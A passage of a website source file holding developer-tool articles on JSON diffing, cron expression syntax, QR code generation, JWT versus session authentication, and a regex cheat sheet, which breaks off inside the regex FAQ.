Store expected API responses as JSON fixtures. After a code change, diff the new response against the fixture to catch unintended changes.

### Auditing State Changes
In Redux or similar state management patterns, log state snapshots and diff them to understand exactly what actions changed.

## Types of Differences

A JSON diff typically reports three types of changes:

### Added Keys
A key exists in the second (new) object but not the first (old):
\`\`\`json
// Old
{ "name": "Alice", "role": "admin" }

// New
{ "name": "Alice", "role": "admin", "email": "alice@example.com" }

// Diff: + "email": "alice@example.com"
\`\`\`

### Removed Keys
A key exists in the first (old) object but not the second (new):
\`\`\`json
// Old
{ "name": "Alice", "legacy_id": 12345 }

// New
{ "name": "Alice" }

// Diff: - "legacy_id": 12345
\`\`\`

### Changed Values
A key exists in both objects but the value is different:
\`\`\`json
// Old
{ "status": "pending", "retries": 0 }

// New
{ "status": "complete", "retries": 3 }

// Diff: ~ "status": "pending" → "complete"
//       ~ "retries": 0 → 3
\`\`\`

## Nested Object Diffing

A good JSON diff recursively compares nested objects:

\`\`\`json
// Old
{
  "user": {
    "name": "Alice",
    "address": { "city": "Paris", "country": "FR" }
  }
}

// New
{
  "user": {
    "name": "Alice",
    "address": { "city": "Lyon", "country": "FR" }
  }
}

// Diff: ~ user.address.city: "Paris" → "Lyon"
\`\`\`

Reporting the full path (\`user.address.city\`) rather than just the key name (\`city\`) is essential for large, deeply nested objects.

## Array Diffing Challenges

Arrays are harder to diff than objects because elements don't have inherent identifiers. Two strategies:

### Index-Based Diffing
Compare elements at the same array index. Simple, but sensitive to reordering: if an element is inserted at the start, everything after it appears as "changed."

### Key-Based Diffing
If array elements are objects with a known identifier field (like \`id\` or \`slug\`), match elements by that key before comparing. This correctly handles reordering, insertion, and deletion.

## Practical Examples

### Comparing API Responses
\`\`\`javascript
// Fetch before and after your change
const before = await fetch('/api/users/1').then(r => r.json());
// ... make your change ...
const after = await fetch('/api/users/1').then(r => r.json());

// Paste both into the JSON Diff tool to see what changed
\`\`\`

### Comparing package.json Files
When upgrading dependencies, diffing the old and new \`package.json\` confirms which packages changed versions and which new dependencies were added.

### Comparing Config Files
Environments often store config as JSON. Diffing \`config.staging.json\` against \`config.production.json\` surfaces any values that should match but don't.

## JSON Diff vs Text Diff

| Feature | JSON Diff | Text Diff |
|---------|-----------|-----------|
| Understands structure | ✅ | ❌ |
| Ignores formatting | ✅ | ❌ |
| Handles key reordering | ✅ | ❌ |
| Works without JSON knowledge | ❌ | ✅ |
| Works on non-JSON content | ❌ | ✅ |
| Shows path to changed key | ✅ | ❌ |

For JSON content, always use a semantic JSON diff. Reserve text diff for non-structured content.

## How to Read a Diff Output

Standard diff notation uses symbols:

- \`+\` (green): Added in new version
- \`-\` (red): Removed from old version
- \`~\` or no symbol (yellow): Value changed
- No change: Key exists in both with identical values (often hidden to reduce noise)

When comparing large JSON objects, use the "hide unchanged keys" option to focus only on what's different.

→ Use the [JSON Diff](/json-diff) tool to paste two JSON objects side-by-side and get an instant, structured comparison highlighting every change.`,
  },

  // ─── New SEO/GEO Articles ─────────────────────────────────────────────────
  {
    slug: 'cron-expression-cheat-sheet',
    toolPath: '/crontab-generator',
    title: 'Cron Expression Cheat Sheet: Every Syntax Pattern with Examples',
    description: 'A complete reference for cron expression syntax — from basic schedules to advanced patterns. Every field explained with real-world examples you can copy and use.',
    keywords: ['cron expression', 'crontab examples', 'cron job syntax', 'cron every 5 minutes', 'cron schedule', 'crontab cheat sheet'],
    category: 'Development',
    publishedAt: '2026-05-22',
    content: `## Understanding Cron Syntax

A cron expression is a string of five (or six) fields that defines when a scheduled job runs. Each field represents a unit of time, and together they form a precise schedule that repeats automatically.

The standard five-field format:

\`\`\`
┌───────────── minute (0–59)
│ ┌───────────── hour (0–23)
│ │ ┌───────────── day of month (1–31)
│ │ │ ┌───────────── month (1–12)
│ │ │ │ ┌───────────── day of week (0–7, where 0 and 7 are Sunday)
│ │ │ │ │
* * * * *
\`\`\`

Some systems (like AWS EventBridge, Quartz Scheduler) add a **seconds** field before the minute, making it six fields total.

## Special Characters Explained

| Character | Meaning | Example |
|-----------|---------|---------|
| \`*\` | Any value | \`* * * * *\` — every minute |
| \`,\` | List of values | \`1,15,30\` in minute — at 1st, 15th, 30th minute |
| \`-\` | Range | \`9-17\` in hour — from 9am to 5pm |
| \`/\` | Step | \`*/5\` in minute — every 5 minutes |
| \`L\` | Last | \`L\` in day-of-month — last day of the month |
| \`#\` | Nth weekday | \`2#3\` — third Tuesday of the month |
| \`?\` | No specific value | Used in day-of-month or day-of-week when the other is set |

## The Most Common Cron Schedules

These are the patterns developers reach for most often:

### Every Minute
\`\`\`
* * * * *
\`\`\`
Rarely used in production. Avoid this for anything with meaningful I/O — it runs 1,440 times a day.

### Every 5 Minutes
\`\`\`
*/5 * * * *
\`\`\`
The most common schedule for health checks, polling tasks, and lightweight background jobs.

### Every 15 Minutes
\`\`\`
*/15 * * * *
\`\`\`
Good for syncing data or checking for updates without overwhelming a service.

### Every Hour (at the top)
\`\`\`
0 * * * *
\`\`\`
Runs at minute 0 of every hour: 1:00, 2:00, 3:00...

### Every Hour (at a specific minute)
\`\`\`
30 * * * *
\`\`\`
Runs at minute 30 of every hour: 1:30, 2:30, 3:30... Useful to offset from the top of the hour when servers are busy.

### Once a Day at Midnight
\`\`\`
0 0 * * *
\`\`\`
Daily cleanup jobs, report generation, cache invalidation.

### Once a Day at 2 AM
\`\`\`
0 2 * * *
\`\`\`
Database backups, log rotation — scheduled during off-peak hours.

### Every Day at 8 AM and 6 PM
\`\`\`
0 8,18 * * *
\`\`\`
Twice-daily summaries or digest emails.

### Every Weekday at 9 AM
\`\`\`
0 9 * * 1-5
\`\`\`
Business-hours-only jobs: send morning reports, sync calendars.

### Every Monday at Midnight
\`\`\`
0 0 * * 1
\`\`\`
Weekly tasks: generate weekly summaries, clean up old sessions.

### First Day of Every Month
\`\`\`
0 0 1 * *
\`\`\`
Monthly billing cycles, subscription renewals, report generation.

### Last Day of Every Month
\`\`\`
0 0 L * *
\`\`\`
Note: \`L\` is supported in Quartz and some extended cron parsers, but not standard Unix crontab. For standard cron, use a script that checks the date.

## Complete Reference Table

| Schedule | Expression | Notes |
|----------|------------|-------|
| Every minute | \`* * * * *\` | 1,440 runs/day |
| Every 5 min | \`*/5 * * * *\` | 288 runs/day |
| Every 10 min | \`*/10 * * * *\` | 144 runs/day |
| Every 15 min | \`*/15 * * * *\` | 96 runs/day |
| Every 30 min | \`*/30 * * * *\` | 48 runs/day |
| Every hour | \`0 * * * *\` | 24 runs/day |
| Every 2 hours | \`0 */2 * * *\` | 12 runs/day |
| Every 6 hours | \`0 */6 * * *\` | 4 runs/day |
| Daily at midnight | \`0 0 * * *\` | 1 run/day |
| Daily at noon | \`0 12 * * *\` | 1 run/day |
| Every weekday | \`0 0 * * 1-5\` | 5 runs/week |
| Every weekend | \`0 0 * * 6,0\` | 2 runs/week |
| Weekly (Monday) | \`0 0 * * 1\` | 1 run/week |
| Monthly (1st) | \`0 0 1 * *\` | 1 run/month |
| Monthly (15th) | \`0 0 15 * *\` | 1 run/month |
| Yearly (Jan 1) | \`0 0 1 1 *\` | 1 run/year |

## Cron in Different Environments

The base syntax is the same, but each platform has quirks.

### Linux / Unix crontab
\`\`\`bash
# Edit your crontab
crontab -e

# View current crontab
crontab -l

# System-wide crontabs live in /etc/cron.d/
# Each line: minute hour day month weekday user command
*/5 * * * * deploy /usr/bin/python3 /opt/scripts/check.py
\`\`\`

### GitHub Actions
\`\`\`yaml
on:
  schedule:
    - cron: '0 9 * * 1-5'  # Weekdays at 9 AM UTC
\`\`\`
GitHub Actions uses UTC. The minimum interval is every 5 minutes, and jobs may be delayed during heavy load.

### AWS EventBridge (CloudWatch Events)
AWS uses a six-field format with seconds first, and minutes second:
\`\`\`
cron(0 12 * * ? *)   # Every day at noon UTC
cron(0/5 * * * ? *)  # Every 5 minutes
\`\`\`
Note: AWS uses \`?\` in place of \`*\` for day-of-month or day-of-week when the other is specified.

### Node.js (node-cron)
\`\`\`javascript
const cron = require('node-cron');

// Every 5 minutes
cron.schedule('*/5 * * * *', () => {
  console.log('Running task every 5 minutes');
});

// Every weekday at 9 AM
cron.schedule('0 9 * * 1-5', () => {
  sendMorningReport();
});
\`\`\`

### Python (APScheduler)
\`\`\`python
from apscheduler.schedulers.blocking import BlockingScheduler

scheduler = BlockingScheduler()

@scheduler.scheduled_job('cron', hour=9, minute=0, day_of_week='mon-fri')
def send_daily_report():
    print('Sending report...')

scheduler.start()
\`\`\`

## Common Mistakes

**Not using UTC** — Most cron systems run in UTC. A job at "midnight" may fire at noon your time. Always check which timezone your scheduler uses and document it explicitly.

**Using \`*\` in every field** — \`* * * * *\` fires every minute. If your job takes more than 60 seconds to run, overlapping executions will pile up. Add locking or use \`*/5\` at minimum.

**Day-of-month and day-of-week interactions** — In standard cron, if both are set (not \`*\`), the job runs when *either* condition is true, not both. This is the source of many unexpected extra runs. Use \`?\` in systems that support it to explicitly say "I don't care about this field."

**No error alerting** — A failed cron job often fails silently. Always redirect stderr to a log file and set up monitoring or alerting for failed runs.

\`\`\`bash
# Capture both stdout and stderr
*/5 * * * * /opt/script.sh >> /var/log/script.log 2>&1
\`\`\`

## FAQ

**How do I run a cron job every 2 hours starting at midnight?**
\`0 */2 * * *\` — This runs at 0:00, 2:00, 4:00, ... 22:00.

**How do I run a cron job at 9:30 AM and 3:30 PM?**
\`30 9,15 * * *\`

**Can a cron expression run on the last weekday of the month?**
Not in standard cron. You need a script that calculates this, or use an extended scheduler like Quartz.

**What's the smallest interval cron supports?**
Standard cron supports down to every minute (\`* * * * *\`). For sub-minute intervals, use a process manager, a message queue, or a scheduler that supports seconds.

→ Use the [Crontab Generator](/crontab-generator) to build and validate any cron expression visually — no syntax memorization needed.`,
  },
  {
    slug: 'how-to-generate-qr-code-complete-guide',
    toolPath: '/qrcode-generator',
    title: 'How to Generate a QR Code: A Complete Guide for Every Use Case',
    description: 'Learn how to generate QR codes for websites, Wi-Fi, business cards, payments, and more. Covers QR code structure, error correction, size requirements, and best practices.',
    keywords: ['how to generate qr code', 'qr code generator', 'qr code for website', 'wifi qr code', 'qr code best practices', 'qr code size'],
    category: 'Web',
    publishedAt: '2026-05-23',
    content: `## What Is a QR Code?

A QR code (Quick Response code) is a two-dimensional barcode that encodes data as a pattern of black and white squares. Unlike a traditional barcode that stores data in one direction only, a QR code stores data both horizontally and vertically — which is why it can hold significantly more information in a smaller space.

A typical QR code can store up to 3,000 alphanumeric characters or about 7,000 numeric digits. That's enough for a long URL, a Wi-Fi password, contact information, or a short paragraph of text.

## How QR Codes Work

Every QR code contains several functional regions:

**Finder patterns** — The three square shapes in three corners that allow a camera to detect the code's orientation and boundaries from any angle.

**Alignment patterns** — Small squares near the lower-right corner (present in larger codes) that help decode the code even when the image is distorted.

**Timing patterns** — Alternating black and white squares running between the finder patterns that help the decoder determine the grid dimensions.

**Data area** — The rest of the code, which stores the actual encoded content plus error correction bits.

**Quiet zone** — A white border around the entire code (at least 4 modules wide) required for reliable scanning.

## Error Correction Levels

One of the most important choices when generating a QR code is the error correction level. QR codes can be scanned even when partially damaged, obscured, or printed poorly — but only if you've selected an appropriate error correction level.

| Level | Name | Data recovery | Use case |
|-------|------|---------------|----------|
| L | Low | Up to 7% | Digital displays, clean environments |
| M | Medium | Up to 15% | Most general uses |
| Q | Quartile | Up to 25% | Labels, environments with some dirt or wear |
| H | High | Up to 30% | Logos overlaid on QR code, outdoor signage |

Higher error correction means more redundant data, which means the QR code must be larger (more squares) to hold the same content. For a simple URL, Level M is the standard choice. If you want to overlay your logo on the QR code, use Level H.

## What You Can Encode in a QR Code

### Website URL
The most common use case. Just encode the full URL:
\`\`\`
https://example.com/landing-page?utm_source=qr
\`\`\`
Always include the protocol (\`https://\`). Without it, some scanners open the text in a notes app instead of a browser.

### Wi-Fi Network
Encoding Wi-Fi credentials lets anyone scan and connect without typing a password. The format:
\`\`\`
WIFI:T:WPA;S:NetworkName;P:password123;H:false;;
\`\`\`

Fields:
- \`T:\` — Security type: \`WPA\`, \`WEP\`, or \`nopass\`
- \`S:\` — SSID (network name)
- \`P:\` — Password
- \`H:\` — Hidden network: \`true\` or \`false\`

### Contact Information (vCard)
\`\`\`
BEGIN:VCARD
VERSION:3.0
FN:Jane Smith
ORG:Acme Corp
TEL:+1-555-123-4567
EMAIL:jane@acme.com
URL:https://acme.com
END:VCARD
\`\`\`

### Email
\`\`\`
mailto:contact@example.com?subject=Hello&body=I scanned your QR code
\`\`\`

### Phone Number
\`\`\`
tel:+15551234567
\`\`\`

### SMS
\`\`\`
sms:+15551234567?body=Hello%20there
\`\`\`

### Plain Text
Any text string works. Useful for sharing codes, product IDs, or short instructions.

## QR Code Size Guide

The size you need depends on the scanning distance and the amount of data encoded.

| Scanning distance | Minimum QR code size |
|-------------------|----------------------|
| 10 cm (phone in hand) | 1 cm × 1 cm |
| 30 cm (desk distance) | 3 cm × 3 cm |
| 1 meter (close-up poster) | 5 cm × 5 cm |
| 3 meters (across the room) | 15 cm × 15 cm |
| 5 meters (storefront) | 25 cm × 25 cm |
| 10 meters (outdoor banner) | 50 cm × 50 cm |

Rule of thumb: the QR code should be at least 1/10 of the scanning distance. If people will scan from 1 meter away, make it at least 10 cm × 10 cm.

**Module size matters more than overall size.** Each small square (module) in the code needs to be at least 0.3 mm for reliable printing. A QR code with 33 × 33 modules at minimum quality needs at least 1 cm × 1 cm printed.

## Choosing the Right Format for Export

**PNG** — Best for digital use: websites, email, presentations. Lossless compression preserves sharp edges. Use at 2× or 3× the display size for retina screens.

**SVG** — Best for print. Scales to any size without pixelation. If you're sending to a printer or putting on merchandise, always use SVG.

**JPEG** — Avoid for QR codes. JPEG's lossy compression creates artifacts around the edges of squares, which can cause scan failures.

**PDF** — Good for professional print production. Often includes the SVG data embedded at high resolution.

## Dynamic vs Static QR Codes

**Static QR codes** encode the destination directly. The URL is baked into the pattern — you cannot change it later without generating a new code.

**Dynamic QR codes** encode a short redirect URL that points to a service that then forwards to your actual destination. This lets you:
- Change the destination without reprinting
- Track scan counts by location, date, and device
- A/B test different landing pages
- Expire or deactivate a code

For print materials (flyers, packaging, business cards), dynamic QR codes are worth the trade-off of depending on a redirect service. For digital use where you control the destination, static codes are simpler and have no single point of failure.

## Design and Branding

You can customize QR codes while keeping them scannable:

**Color** — The dark modules can be any dark color; the light modules can be any light color. The contrast ratio must remain high. Dark on light always, never light on dark.

**Logo overlay** — Place a logo in the center of the QR code. Use error correction level H, and keep the logo under 30% of the total code area.

**Rounded modules** — Some generators allow rounding the corners of individual modules. This works fine as long as the quiet zone and finder patterns remain clear.

**Background** — The quiet zone (white border) must be maintained. Printing on colored paper or a texture requires testing — always verify scannability before mass printing.

## Common Mistakes

**No quiet zone** — The white border is not decorative. Scanners need it to find the code boundaries. Leave at least 4 module widths of white space on all sides.

**Too much data for the size** — More content means a denser code. A dense code printed small becomes unreliable. Either reduce the data or increase the print size.

**Low print quality** — QR codes for print need at least 300 DPI. At 72 DPI (screen resolution), they look fine on screen but become blurry when printed.

**Linking to a non-mobile-friendly page** — QR codes are almost always scanned on phones. Test the landing page on mobile before publishing.

**Missing UTM parameters** — For marketing QR codes, add UTM tracking (\`?utm_source=qr&utm_campaign=flyer\`) so you can measure results in Google Analytics.

## Testing Before Publishing

Always test your QR code with at least two different scanning apps before printing. Common options:
- iPhone Camera app (built-in)
- Google Lens
- QR & Barcode Scanner (Android)
- Scan it at various distances and angles
- Print a test copy at the intended final size

A code that scans reliably on screen may fail when printed at a small size or on textured paper.

→ Use the [QR Code Generator](/qrcode-generator) to create QR codes for URLs, Wi-Fi, contacts, and more — with color options and instant download in PNG or SVG.

For Wi-Fi-specific QR codes with the correct WIFI: format, try the [Wi-Fi QR Code Generator](/wifi-qrcode-generator).`,
  },
  {
    slug: 'jwt-vs-session-tokens-authentication',
    toolPath: '/jwt-parser',
    title: 'JWT vs Session Tokens: Which Authentication Method Should You Use?',
    description: 'A practical comparison of JWT and session-based authentication — covering how each works, their security trade-offs, scalability implications, and when to choose one over the other.',
    keywords: ['jwt vs session', 'jwt authentication', 'session token vs jwt', 'stateless authentication', 'jwt security', 'session based auth'],
    category: 'Crypto',
    publishedAt: '2026-05-24',
    content: `## Two Ways to Prove Who You Are

After a user logs in with a username and password, the server needs a way to recognize that user on subsequent requests — because HTTP is stateless. Every request arrives without inherent memory of what came before.

There are two dominant approaches to solving this:

1. **Session tokens** — The server creates a record of the login, stores it, and gives the client a reference key (the session ID) to present on future requests.
2. **JWTs (JSON Web Tokens)** — The server creates a self-contained token containing the user's identity and claims, signs it, and gives it to the client. No server-side storage required.

Both approaches work. They make different trade-offs.

## How Session-Based Authentication Works

1. User sends credentials to \`POST /login\`
2. Server verifies them and creates a session record in storage (database, Redis, memory)
3. Server returns a session ID as a cookie (typically \`HttpOnly; Secure; SameSite=Strict\`)
4. Browser attaches the cookie automatically to every subsequent request
5. Server looks up the session ID in storage on each request to identify the user
6. To log out, the server deletes the session record — the session ID immediately stops working

The session ID itself is meaningless — it's a random opaque string like \`sess_a3f9d2c8b4\`. All the actual user data lives on the server.

## How JWT Authentication Works

1. User sends credentials to \`POST /login\`
2. Server verifies them and creates a JWT containing claims (user ID, roles, expiry)
3. Server signs the JWT with a secret key (HMAC) or private key (RSA/ECDSA)
4. Server returns the JWT — client stores it in memory, localStorage, or a cookie
5. Client sends the JWT in the \`Authorization: Bearer <token>\` header on each request
6. Server validates the signature and reads the claims without any storage lookup
7. To "log out," the client discards the token — but the token remains valid until its \`exp\` claim passes

A decoded JWT payload looks like this:
\`\`\`json
{
  "sub": "user_12345",
  "email": "alice@example.com",
  "roles": ["user", "editor"],
  "iat": 1716800000,
  "exp": 1716886400
}
\`\`\`

The signature on the outside of the token ensures this payload hasn't been tampered with.

## Side-by-Side Comparison

| Property | Session Token | JWT |
|----------|--------------|-----|
| Server-side storage | Required (DB, Redis) | Not required |
| Instant revocation | Yes — delete the session | No — must wait for expiry |
| Scalability | Requires shared storage in multi-server setups | Works on any server without coordination |
| Token size | Small (random ID, ~20–40 bytes) | Larger (encoded claims, ~200–600 bytes) |
| Payload readable by client | No | Yes (base64-decoded, but not secretly) |
| Best transport | HttpOnly cookie | Authorization header or HttpOnly cookie |
| Logout effectiveness | Complete | Only removes client copy |
| Complexity | Simple to implement and reason about | Requires understanding JWT spec |

## The Revocation Problem with JWTs

This is the most frequently misunderstood trade-off. JWTs are valid until they expire. If a user's account is compromised, or an admin needs to immediately invalidate a token, there's no server-side record to delete.

Solutions exist, but each adds complexity:

**Short expiry + refresh tokens** — Issue access tokens that expire in 15 minutes and refresh tokens that expire in days or weeks. Compromised access tokens become invalid quickly. This is the most widely recommended pattern.

**Token blocklist** — Maintain a database of invalidated JWT IDs (\`jti\` claim). Check it on every request. This brings back server-side storage — but now you're only storing exceptions, not all sessions.

**Version field in user record** — Include a \`token_version\` claim in the JWT. Store the current version in the user record. Increment it on logout or password change. Reject tokens with a lower version. Requires one DB read per request.

For applications where instant revocation is critical (financial services, security-sensitive admin tools), session tokens are simpler and more predictable.

## The Scalability Argument

JWT's most-cited advantage is horizontal scalability. With sessions, every request needs to reach the session store. In a multi-server setup, that means either sticky sessions (route each user to the same server), or a shared external store like Redis.

With JWTs, any server can validate any token without coordination — just check the signature. This genuinely simplifies distributed architectures.

But the practical difference is smaller than often claimed. Redis handles millions of lookups per second. For most applications, the session store is not the bottleneck. The scalability argument matters most at very large scale or in serverless/edge computing contexts where global state is genuinely difficult to share.

## Security Considerations

### JWT Storage
Where you store the JWT matters enormously.

**localStorage** — Simple to implement but vulnerable to XSS. Any JavaScript on your page (including third-party scripts) can read localStorage. If your app has an XSS vulnerability, an attacker steals every user's token.

**sessionStorage** — Same XSS risk as localStorage, but tokens are cleared when the tab closes.

**HttpOnly cookie** — The browser handles the cookie automatically and JavaScript cannot read it. This is the most secure option for web apps. It's also resistant to CSRF when combined with \`SameSite=Strict\` or CSRF tokens.

**Memory (JavaScript variable)** — XSS-resistant but tokens are lost on page reload. Pairs well with a refresh token in an HttpOnly cookie.

Recommendation: Store JWTs in HttpOnly cookies for web apps. Store them in memory for single-page applications that need to read claims client-side, with a refresh token in a cookie.

### Algorithm Selection
Always specify the expected algorithm when validating JWTs. A historical vulnerability allowed attackers to change the algorithm to \`alg: none\`, bypassing signature verification entirely. Modern JWT libraries handle this if you configure them correctly:

\`\`\`javascript
// Node.js (jsonwebtoken)
jwt.verify(token, secret, { algorithms: ['HS256'] }); // Always specify

// Never do this — susceptible to algorithm confusion
jwt.verify(token, secret);
\`\`\`

### Short Expiry Times
Access tokens should expire in 15–60 minutes. Refresh tokens in 7–30 days with rotation. Long-lived access tokens are the most common JWT security mistake.

## When to Use Sessions

- Traditional server-rendered web applications (Django, Rails, Laravel)
- Applications requiring instant logout or account termination
- Applications where the user data in the token would be large or change frequently
- When simplicity and debuggability matter more than stateless scalability

## When to Use JWTs

- APIs consumed by mobile apps (no automatic cookie handling)
- Microservices where multiple services need to verify identity without hitting a central DB
- Serverless and edge computing environments where global state is expensive
- Single sign-on (SSO) scenarios where tokens cross domain boundaries

## The Hybrid Approach

Many production systems use both. A session cookie handles web browser login. JWTs are issued as short-lived access tokens for API calls, especially from mobile clients or third-party integrations. Refresh tokens — stored in secure HttpOnly cookies — allow transparent renewal without re-login.

This combination gives you the security of server-side session management for the primary login, the stateless scalability of JWTs for API authorization, and instant revocation via the session/refresh token.

→ Use the [JWT Parser](/jwt-parser) to decode and inspect any JWT token, read its claims, and check its expiry — no secret key required.`,
  },
  {
    slug: 'regex-cheat-sheet-patterns-examples',
    toolPath: '/regex-tester',
    title: 'Regex Cheat Sheet: Every Pattern You\'ll Actually Use',
    description: 'A practical regex reference with real-world patterns for emails, URLs, passwords, dates, IP addresses, and more. Includes syntax tables and working code examples in JavaScript, Python, and other languages.',
    keywords: ['regex cheatsheet', 'regular expression examples', 'regex patterns', 'regex email match', 'regex syntax', 'regex reference'],
    category: 'Development',
    publishedAt: '2026-05-25',
    content: `## Regex Syntax Quick Reference

Regular expressions use a compact syntax where most characters match themselves, but certain characters have special meaning.

### Character Classes

| Pattern | Matches |
|---------|---------|
| \`.\` | Any character except newline |
| \`\\w\` | Word character: \`[a-zA-Z0-9_]\` |
| \`\\W\` | Non-word character |
| \`\\d\` | Digit: \`[0-9]\` |
| \`\\D\` | Non-digit |
| \`\\s\` | Whitespace (space, tab, newline) |
| \`\\S\` | Non-whitespace |
| \`[abc]\` | Any of a, b, or c |
| \`[^abc]\` | Anything except a, b, c |
| \`[a-z]\` | Any lowercase letter |
| \`[A-Z]\` | Any uppercase letter |
| \`[0-9]\` | Any digit (same as \\d) |
| \`[a-zA-Z]\` | Any letter |

### Quantifiers

| Pattern | Matches |
|---------|---------|
| \`*\` | 0 or more |
| \`+\` | 1 or more |
| \`?\` | 0 or 1 (optional) |
| \`{n}\` | Exactly n times |
| \`{n,}\` | n or more times |
| \`{n,m}\` | Between n and m times |
| \`*?\` | 0 or more (lazy) |
| \`+?\` | 1 or more (lazy) |

Greedy vs lazy matters when the pattern could match multiple ways. \`<.*>\` on \`<b>text</b>\` matches the entire string. \`<.*?>\` matches \`<b>\` only.

### Anchors and Boundaries

| Pattern | Matches |
|---------|---------|
| \`^\` | Start of string (or start of line in multiline mode) |
| \`$\` | End of string (or end of line in multiline mode) |
| \`\\b\` | Word boundary |
| \`\\B\` | Not a word boundary |
| \`\\A\` | Start of string (Python, ignores multiline) |
| \`\\Z\` | End of string (Python, ignores multiline) |

### Groups and Alternation

| Pattern | Meaning |
|---------|---------|
| \`(abc)\` | Capturing group |
| \`(?:abc)\` | Non-capturing group |
| \`(?<name>abc)\` | Named capturing group |
| \`a\|b\` | Alternation: match a or b |
| \`(?=abc)\` | Positive lookahead: followed by abc |
| \`(?!abc)\` | Negative lookahead: not followed by abc |
| \`(?<=abc)\` | Positive lookbehind: preceded by abc |
| \`(?<!abc)\` | Negative lookbehind: not preceded by abc |

## Real-World Patterns

### Email Address
\`\`\`regex
^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$
\`\`\`
This matches the vast majority of valid email formats. Full RFC 5322 compliance requires a much more complex regex — but this 95% solution handles all common cases.

Matches: \`user@example.com\`, \`first.last+tag@sub.domain.co.uk\`
Rejects: \`user@\`, \`@example.com\`, \`user @example.com\`

### URL
\`\`\`regex
https?://[^\\s/$.?#].[^\\s]*
\`\`\`
Matches http and https URLs. For production validation, use the URL constructor instead of regex — it handles all edge cases correctly.

### IPv4 Address
\`\`\`regex
^(25[0-5]|2[0-4]\\d|1\\d{2}|[1-9]\\d|\\d)(\\.(25[0-5]|2[0-4]\\d|1\\d{2}|[1-9]\\d|\\d)){3}$
\`\`\`
Validates that each octet is 0–255. Matches: \`192.168.1.1\`, \`0.0.0.0\`, \`255.255.255.255\`. Rejects: \`256.0.0.1\`, \`192.168.1\`.

### Phone Number (US)
\`\`\`regex
^(\\+1[\\s.-]?)?\\(?[2-9]\\d{2}\\)?[\\s.-]?[2-9]\\d{2}[\\s.-]?\\d{4}$
\`\`\`
Matches: \`555-867-5309\`, \`(555) 867-5309\`, \`+1 555 867 5309\`

### Date (YYYY-MM-DD)
\`\`\`regex
^\\d{4}-(0[1-9]|1[0-2])-(0[1-9]|[12]\\d|3[01])$
\`\`\`
Validates format and range (months 01–12, days 01–31). Does not validate day/month combinations — use a date library for that.

### Time (HH:MM:SS)
\`\`\`regex
^([01]\\d|2[0-3]):[0-5]\\d:[0-5]\\d$
\`\`\`
24-hour format. Hours 00–23, minutes and seconds 00–59.

### Strong Password
\`\`\`regex
^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[!@#$%^&*])[A-Za-z\\d!@#$%^&*]{8,}$
\`\`\`
Requires at least 8 characters, one uppercase, one lowercase, one digit, one special character. Uses lookaheads to check each requirement independently.

### Hex Color Code
\`\`\`regex
^#([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})$
\`\`\`
Matches \`#ff6600\` and shorthand \`#f60\`. Case insensitive.

### Slug (URL-friendly string)
\`\`\`regex
^[a-z0-9]+(?:-[a-z0-9]+)*$
\`\`\`
Matches: \`my-blog-post\`, \`product-123\`. Rejects: \`-starts-with-dash\`, \`has spaces\`, \`UPPERCASE\`.

### Credit Card Number
\`\`\`regex
^(4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12})$
\`\`\`
Matches Visa, MasterCard, Amex, Discover. Always strip spaces/dashes before matching.

### JWT Token
\`\`\`regex
^[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]*$
\`\`\`
Three Base64url-encoded segments separated by dots.

### HTML Tag
\`\`\`regex
<([a-zA-Z][a-zA-Z0-9]*)\\b[^>]*>(.*?)<\\/\\1>
\`\`\`
Matches a tag and its content. Note: parsing HTML with regex is fragile for nested elements — use a proper HTML parser for anything complex.

### Markdown Header
\`\`\`regex
^(#{1,6})\\s+(.+)$
\`\`\`
Captures heading level and text. Group 1: \`#\` to \`######\`. Group 2: heading text.

## Code Examples

### JavaScript
\`\`\`javascript
// Test if a string matches
const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/;
emailRegex.test('user@example.com'); // true

// Extract matches
const text = 'Call 555-867-5309 or 555-123-4567';
const phoneRegex = /\\d{3}-\\d{3}-\\d{4}/g;
text.match(phoneRegex); // ['555-867-5309', '555-123-4567']

// Replace matches
'hello_world_test'.replace(/_/g, '-'); // 'hello-world-test'

// Named capture groups
const dateRegex = /(?<year>\\d{4})-(?<month>\\d{2})-(?<day>\\d{2})/;
const { year, month, day } = '2026-05-15'.match(dateRegex).groups;
\`\`\`

### Python
\`\`\`python
import re

# Test match
pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'
bool(re.match(pattern, 'user@example.com'))  # True

# Find all matches
text = 'Dates: 2026-01-15 and 2026-03-20'
dates = re.findall(r'\\d{4}-\\d{2}-\\d{2}', text)
# ['2026-01-15', '2026-03-20']

# Named groups
m = re.search(r'(?P<year>\\d{4})-(?P<month>\\d{2})', '2026-05')
m.group('year')  # '2026'

# Replace with function
result = re.sub(r'\\b(\\w)', lambda m: m.group().upper(), 'hello world')
# 'Hello World'
\`\`\`

## Flags Reference

| Flag | JavaScript | Python | Effect |
|------|-----------|--------|--------|
| Case insensitive | \`/regex/i\` | \`re.IGNORECASE\` | \`A\` matches \`a\` |
| Multiline | \`/regex/m\` | \`re.MULTILINE\` | \`^\` and \`$\` match line boundaries |
| Dotall | \`/regex/s\` | \`re.DOTALL\` | \`.\` matches newlines |
| Global | \`/regex/g\` | (use \`findall\`) | Find all matches, not just first |
| Verbose | N/A | \`re.VERBOSE\` | Allows whitespace and comments in pattern |

## Performance Tips

**Compile patterns you reuse** — In Python, \`re.compile(pattern)\` creates a reusable regex object. In JavaScript, a regex literal \`/pattern/\` is compiled once per load.

**Avoid catastrophic backtracking** — Patterns like \`(a+)+\` on long strings can take exponential time. This is the source of ReDoS (Regular Expression Denial of Service) attacks. Keep quantifiers simple and avoid nested repetition on the same character class.

**Use non-capturing groups when you don't need the match** — \`(?:abc)\` is faster than \`(abc)\` because the engine doesn't store the match.

**Anchor when possible** — Adding \`^\` and \`$\` where appropriate stops the engine from searching the entire input when the match fails.

## FAQ

**What's the difference between \`match\` and \`search\` in Python?**
\`re.match\` only matches at the beginning of the string. \`re.search\` scans through the string looking for any match. For most use cases, \`re.search\` is what you want.

**Why does my regex work in one language but not another?**
